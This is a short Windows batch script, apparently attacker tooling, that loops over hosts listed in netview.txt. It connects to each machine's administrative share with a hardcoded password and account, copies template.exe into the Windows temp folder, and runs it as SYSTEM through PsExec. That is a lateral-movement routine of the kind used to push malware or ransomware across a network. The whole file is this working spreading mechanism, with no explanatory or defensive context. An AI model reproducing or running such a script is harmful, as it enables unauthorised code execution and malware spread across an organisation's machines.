@echo off
for /f   %%i in (netview.txt) do (
  net use  \\%%i  "G"    /user:NT\SQL3
  copy template.exe \\%%i\c$\windows\temp\template.exe
  psexec.exe  /accepteula
  Psexec.exe -s \\%%i c:\WINDOWS\system32\cmd.exe  /c start  c:\WINDOWS\temp\template.exe
  net use \\%%i  /del
 
)